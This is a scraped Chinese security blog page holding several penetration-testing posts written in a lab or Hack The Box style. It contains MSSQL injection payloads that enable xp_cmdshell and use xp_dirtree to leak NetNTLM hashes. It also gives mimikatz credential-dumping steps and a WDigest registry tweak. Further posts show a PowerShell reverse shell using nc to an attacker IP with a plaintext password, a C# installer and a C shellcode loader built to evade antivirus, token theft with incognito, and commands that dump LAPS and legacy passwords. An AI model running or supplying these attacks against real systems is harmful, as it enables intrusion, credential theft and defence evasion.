利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
漏洞利用
默认情况ASP/MSSQL支持堆叠注入：
常用的存储过程xp_cmdshell，它接收一个Windows命令，运行它并将结果以文本行的格式返回;验证是否可执行命令
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC xp_cmdshell &apos;ping -c 4 10.10.14.14&apos;-- -本地监听icmp没有信息返回，即说明没有权限执行或没有开启xp_cmdshell,（xp_cmdhsell默认是禁用的，尝试开启）；尝试开启：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1; EXEC sp_configure &apos;show advanced options&apos;, 1; EXEC sp_configure &apos;xp_cmdshell&apos;, 1; reconfigure with override; exec master..xp_cmdshell &apos;ping -n 10 10.10.14.14&apos; -- -master.dbo.xp_shell  替代 xp_shell尝试绕过， Failed
猜测是没有权限的问题，想到xp_dirtree外带数据：
payload：
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;declare%20@q%20varchar(99);set%20@q=%27\\10.10.14.14\test%27;%20exec%20master.dbo.xp_dirtree%20@q%20--%20-



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记" href="/2020/04/26/mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E5%B0%8F%E8%AE%B0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="mimikatz抓取密码小记" alt="mimikatz抓取密码小记"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; mimikatz抓取密码小记 &gt;</div>
                            <div class="content flex1">
                                
  1、直接抓取本机：
[1]#privilege::debug          //提升权限[2]#sekurlsa::logonpasswords  //抓取密码
离线破解lsass.dmp
[1]dump lsass.dmp 回本地   //procudmp、dumpert、quarkspwdump等方法均可以dump下来
[2]#privilege::debug          //提升权限
[3]#sekurlsa::minidump C:\Users\Administrator\Downloads\mimikatz_trunk\x64\dumpert.dmp
[4]#sekurlsa::logonpasswords  //抓取密码
踩坑点：
[1]报错1：getting error ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)相对路径报错    
解决方法：lsass.dmp要给完整路径，
[2]报错2：ERROR kuhl_m_sekurlsa_acquireLSA ; Key importmimikatz版本过低
解决方法：使用2.0版本
[3]报错3：ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
windows 2012之后明文抓取均会出现这个报错
需要修改注册表开启 WDigest，等待管理员登陆后再次读取，没有做额外防护就可以直接拿到明文了
（mimikatz原理是读取内存中的密码，所以需要再次登录才能读取到）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="内网使用smb无文件执行" alt="内网使用smb无文件执行" href="/2020/04/26/%E5%86%85%E7%BD%91%E4%BD%BF%E7%94%A8smb%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="内网使用smb无文件执行" alt="内网使用smb无文件执行"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 内网使用smb无文件执行 &gt;</div>
                            <div class="content flex1">
                                
  创建smb共享
mkdir smb &amp;&amp; cd smb
cp  ~/winPEAS.exe  ~/smb   ####将需要的软件放到目录下
sudo impacket-smbserver share $(pwd) -smb2support -user Twe1ve -password  123456测试：
$pass = convertto-securestring &apos;123456&apos; -AsPlainText -Force
$cred= New-Object System.Management.Automation.PSCredential(&apos;Twe1ve&apos;,$pass)
New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.61\share
执行：
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘

Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="shell中实现runas命令" alt="shell中实现runas命令" href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="shell中实现runas命令" alt="shell中实现runas命令"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; shell中实现runas命令 &gt;</div>
                            <div class="content flex1">
                                
  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软" href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; C#底层调用powershell过杀软 &gt;</div>
                            <div class="content flex1">
                                
  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
从C#中调用
添加运行powershell需要的程序包：
C#调用powershell安装system.management.automation.dll：
管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
using System;
 using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.Management.Automation.Runspaces;
 public class Program
 {
 public static void Main()
 {
 }
 }
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
 public override void Uninstall(System.Collections.IDictionary savedState)
 {
 Mycode.Exec();
 }
 }
 public class Mycode
 {
 public static void Exec()
 {
 string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
 RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
 Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
 rspace.Open();
 Pipeline pipeline = rspace.CreatePipeline();
 pipeline.Commands.AddScript(command);
 pipeline.Invoke();
 }
 }PS1文件需要适当混淆以过静态查杀



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="C内存加载过杀软" alt="C内存加载过杀软" href="/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="C内存加载过杀软" alt="C内存加载过杀软"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; C内存加载过杀软 &gt;</div>
                            <div class="content flex1">
                                
  C的加载器有好几种，直接把shellcode放进源码中能够过静态层面的查杀，但是运行时会被查杀；
如最常用的加载器：
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)

unsigned char shellcode[] =
&quot;\x31\xdb\x64\x8b\x7b\x30\x8b\x7f&quot;
&quot;\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b&quot;
&quot;\x77\x20\x8b\x3f\x80\x7e\x0c\x33&quot;
&quot;\x75\xf2\x89\xc7\x03\x78\x3c\x8b&quot;
&quot;\x57\x78\x01\xc2\x8b\x7a\x20\x01&quot;
&quot;\xc7\x89\xdd\x8b\x34\xaf\x01\xc6&quot;
&quot;\x45\x81\x3e\x43\x72\x65\x61\x75&quot;
&quot;\xf2\x81\x7e\x08\x6f\x63\x65\x73&quot;
&quot;\x75\xe9\x8b\x7a\x24\x01\xc7\x66&quot;
&quot;\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7&quot;
&quot;\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9&quot;
&quot;\xb1\xff\x53\xe2\xfd\x68\x63\x61&quot;
&quot;\x6c\x63\x89\xe2\x52\x52\x53\x53&quot;
&quot;\x53\x53\x53\x53\x52\x53\xff\xd7&quot;;
void main()
{
    ((void(*)(void))&amp;shellcode)();
}解决方法1：加密shellcode再解密运行（最后用一些比较偏的加密算法）
解决方法2：pyaload分离[1]借助main的入口参数，用户直接输shellcode
[2]从txt文件中加载shellcode
这个当初比较头疼，因为C语言这方面确实不大行，从txt读取shellcode的时候出现问题;记录如下：

获取txt中shellcode长度，申请内存空间


.使用fread读取txt为字符串，加载难以识别出shellcode    


.fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens" href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; incognito Stealing Windows Access Tokens &gt;</div>
                            <div class="content flex1">
                                
  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
0x02、令牌类型
Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
0x03、本地和远程的基本用法
本地： 
查看 token：
incognito.exe list_tokens–u 
获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
0x04、提权、降权、伪造（以本地示例)
incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
在CS下获取TrustedInstaller 

shell sc strat TrustedInstaller 


steal token  1700 ##ps查看TrustedInstaller进程号


shell whoami /groups

链接：
https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
https://blog.csdn.net/qq_36374896/article/details/84261516  
https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
https://www.jianshu.com/p/907c6aab6fd0
http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域渗透之AD Recyle Bin组利用+Ldaps信息枚举 &gt;</div>
                            <div class="content flex1">
                                
  AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中
未启用启用回收站和启用回收站删除对象对比
图1：启用回收站之前已删除的Active Directory对象的生命周期

图2：启用回收站后已删除的Active Directory对象的生命周期

启用AD回收站：
Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’查看删除用户
Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects结果示例：
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059尝试还原已删除账户
Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原或
Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject查询ms-mcs-admpwd
Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  查看有关于特定账户的全部属性信息：
Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来
Ldap枚举：获取基本的账户信息、密码ldapsearch 使用：列出基本的上下文信息
kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts提取整个域目录的数据，然后grep筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.out
root@kali:$ cat ldap.out |grep -i memberof筛选输出：
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType列出管理用户组
kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberofDump LAPS passwords:
kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd同样windapsearch也是一个不错的工具
kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users

...
user:r.thompson
cascadeLegacyPwd: clk0bjVldmE=
...https://github.com/snovvcrash/cheatsheets/tree/master 
https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html 



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                


            </div>
            <div class="swiper-scrollbar"></div>
        </div>
    </div>
</div>
<script>

    function getSwiperPrams() {
        var windowsWidth = $(document).width()
        var slidesPerView
        var direction;
        if(windowsWidth > 1500){
            direction = 'horizontal'
            slidesPerView = 4
        }else if(windowsWidth > 1100){
            direction = 'horizontal'
            slidesPerView = 3
        }else if(windowsWidth > 1000){
            direction = 'horizontal'
            slidesPerView = 2
        }else{
            slidesPerView = 1
            direction = 'vertical'
        }
        return {
            direction: direction,
            slidesPerView: slidesPerView
        }
    }
    var params = getSwiperPrams()

  var mySwiper = new Swiper('.swiper-container', {
    direction: params.direction, // 垂直切换选项
    mousewheel: true,
    slidesPerView: params.slidesPerView,
    spaceBetween: 30,
    scrollbar: {
      el: '.swiper-scrollbar'
    },
    on: {
        resize: function(){

        },
    },

    // 如果需要滚动条
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  })
</script>

  </div>
  <!--
  <div class="main-bottom">
    <div class="music flex flex-pack-justify flex-align-center">
      <div class="control">
        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
      </div>
      <div class="msg">
        <span class="time"></span>
        <div class="line" ref="progress-line-warp">
          <div class="song-msg">周杰伦 - 说好不哭</div>
          <!--<div class="current-line" ref="progress-line">
            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
          </div>-->
        </div>
        <span class="all-time"></span>
      </div>
      <div class="right-control">
        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
          <span class="iconfont icon-ttpodicon"></span>
          <span class="number flex1">3</span>
        </a>
      </div>
      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
        Your browser does not support the audio element.
      </audio>
    </div>
  </div>
  <div class="music-list">
    <div id="musiclist">
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">说好不哭 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">爱在西元前 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">龙拳 - 周杰伦</span>
        </a>
      
    </div>
  </div>
</div>

<script>
  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
  let musics = $('.music-item')
  musics.eq(playIndex).addClass('active')
  var audio = document.getElementById("audio");

  $('.song-msg').html(musics[playIndex].dataset.name)
  audio.src = musics[playIndex].dataset.url


  var playbtn = document.getElementsByClassName("play-icon")[0];
  var playing = false;
  audio.loop = false;
  audio.addEventListener('ended', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  audio.addEventListener('play', function () {
    playbtn.classList.remove("icon-kaishi1")
    playbtn.classList.add("icon-kaishi")
    playing= true
  }, false);
  audio.addEventListener('pause', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  function toogleShowMusicList() {
    var musiclist = document.getElementsByClassName("music-list")[0];
    if(musiclist.className.indexOf("active") === -1){
      musiclist.classList.add("active")
    }else{
      musiclist.classList.remove("active");
    }
  }

  function playControl() {
    if(playing){
      audio.pause()
    }else{
      audio.play()
    }
  }

  function changePlayIndex(index) {
    if(playIndex !== index){
      localStorage.setItem('playIndex',index)
      playIndex = index
      musics.removeClass('active')
      musics.eq(playIndex).addClass('active')
      $('.song-msg').html(musics[playIndex].dataset.name)
      audio.src = musics[playIndex].dataset.url
      audio.play()
    }else{
      playControl()
    }
  }

  function preSong() {
    var index
    if(playIndex === 0){
      index = musics.length - 1
    }else{
      index = playIndex - 1
    }
    changePlayIndex(index)
  }

  function nextSong() {
    var index
    if(playIndex === musics.length - 1){
      index = 0
    }else{
      index = playIndex + 1
    }
    changePlayIndex(index)
  }
-->
  function toggleMenu() {
    var mainLeft = $('.main-left')
    if(mainLeft.hasClass('active')){
      mainLeft.removeClass('active')
      $('.menu').removeClass('icon-close')
      $('.menu').addClass('icon-menu')
    }else{
      mainLeft.addClass('active')
      $('.menu').removeClass('icon-menu')
      $('.menu').addClass('icon-close')
    }
  }
</script>
